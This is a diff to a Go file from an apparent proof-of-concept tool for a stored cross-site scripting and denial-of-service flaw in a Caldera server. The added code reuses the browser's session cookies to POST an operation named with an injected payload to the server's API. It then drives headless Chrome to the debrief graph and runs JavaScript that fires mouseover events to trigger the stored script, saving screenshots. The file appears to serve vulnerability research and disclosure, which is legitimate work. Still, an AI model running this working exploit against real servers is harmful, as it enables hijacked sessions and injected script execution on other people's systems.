@@ -23,14 +23,18 @@ THE SOFTWARE.
 package cmd
 
 import (
+	"bytes"
 	"context"
+	"encoding/json"
 	"fmt"
 	"math"
+	"net/http"
 	"os"
 
 	"github.com/chromedp/cdproto/emulation"
 	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/cdproto/page"
+	"github.com/chromedp/cdproto/runtime"
 	"github.com/chromedp/chromedp"
 	"github.com/fatih/color"
 	log "github.com/sirupsen/logrus"
@@ -88,16 +92,83 @@ func init() {
 	rootCmd.AddCommand(StoredXSSDosCmd)
 }
 
+// Payload is used to represent the POST
+// body associated with the source for the attack.
+type Payload struct {
+	Name               string `json:"name"`
+	AutoClose          bool   `json:"auto_close"`
+	State              string `json:"state"`
+	Autonomous         int    `json:"autonomous"`
+	UseLearningParsers bool   `json:"use_learning_parsers"`
+	Obfuscator         string `json:"obfuscator"`
+	Jitter             string `json:"jitter"`
+	Visibility         string `json:"visibility"`
+}
+
 func storedXSSDosVuln(payload string) error {
 	var buf []byte
+	var res *runtime.RemoteObject
+
+	data := Payload{
+		Name:               payload,
+		AutoClose:          false,
+		State:              "running",
+		Autonomous:         1,
+		UseLearningParsers: true,
+		Obfuscator:         "plain-text",
+		Jitter:             "2/8",
+		Visibility:         "51",
+	}
+	if err := chromedp.Run(caldera.Driver.Context,
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			cookies, err := network.GetAllCookies().Do(ctx)
+			if err != nil {
+				log.WithError(err).Error("failed to retrieve cookies")
+				return err
+			}
+			for _, cookie := range cookies {
+				payloadBytes, err := json.Marshal(data)
+				if err != nil {
+					log.WithError(err).Error("failed to marshal payload")
+					return err
+				}
+				body := bytes.NewReader(payloadBytes)
+
+				req, err := http.NewRequest("POST", "http://localhost:8888/api/v2/operations", body)
+				if err != nil {
+					log.WithError(err).Error("failed to create request")
+					return err
+				}
+				req.Header.Set("Content-Type", "application/json")
+				req.Header.Set("Cookie", fmt.Sprintf("%s=%s", cookie.Name, cookie.Value))
+				req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36")
+
+				resp, err := http.DefaultClient.Do(req)
+				if err != nil {
+					log.WithError(err).Error("failed to submit request")
+					return err
+				}
+				defer resp.Body.Close()
+
+				log.WithFields(log.Fields{
+					"Request": req,
+					"Payload": payload,
+				}).Info(color.GreenString("Successfully introduced payload"))
+			}
+
+			return nil
+
+		})); err != nil {
+		log.WithError(err).Error("failed to retrieve cookie")
+		return err
+	}
 
 	// Selectors for chromeDP
-	pageSelector := "#nav-menu > ul:nth-child(2) > li:nth-child(4) > a"
-	createOPSelector := "#select-operation > div:nth-child(3) > button"
-	opNameSelector := "#op-name"
-	startSelector := "#operationsPage > div > div.modal.is-active > div.modal-card > footer > nav > div.level-right > div > button"
-
+	debriefSelector := "#nav-menu > ul:nth-child(4) > li:nth-child(4) > a"
+	operationSelector := "#tab-debrief > div > div:nth-child(3) > div.columns.mb-6 > div.column.is-3 > form > div > div > div > select > option"
+	dropdownSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
 	imagePath := viper.GetString("image_path")
+	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"
 
 	// listen network event
 	listenForNetworkEvent(caldera.Driver.Context)
@@ -121,12 +192,14 @@ func storedXSSDosVuln(payload string) error {
 	})
 	if err := chromedp.Run(caldera.Driver.Context,
 		network.Enable(),
-		chromedp.Click(pageSelector),
+		chromedp.Click(debriefSelector),
 		chromedp.Sleep(Wait(1000)),
-		chromedp.Click(createOPSelector),
-		chromedp.SendKeys(opNameSelector, payload),
-		chromedp.Click(startSelector),
-		chromedp.Sleep(Wait(2000)),
+		chromedp.Click(operationSelector),
+		chromedp.Sleep(Wait(1000)),
+		chromedp.SendKeys(dropdownSelector, "Tactic"),
+		chromedp.Sleep(Wait(1000)),
+		chromedp.Evaluate(triggerVulnJS, &res),
+		chromedp.Sleep(Wait(1000)),
 		chromedp.ActionFunc(func(ctx context.Context) error {
 
 			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
@@ -171,7 +244,7 @@ func storedXSSDosVuln(payload string) error {
 		return err
 	}
 
-	if err := os.WriteFile(imagePath+"1.png", buf, 0644); err != nil {
+	if err := os.WriteFile(imagePath+"2.png", buf, 0644); err != nil {
 		log.WithError(err).Error("failed to write screenshot to disk")
 		return err
 	}
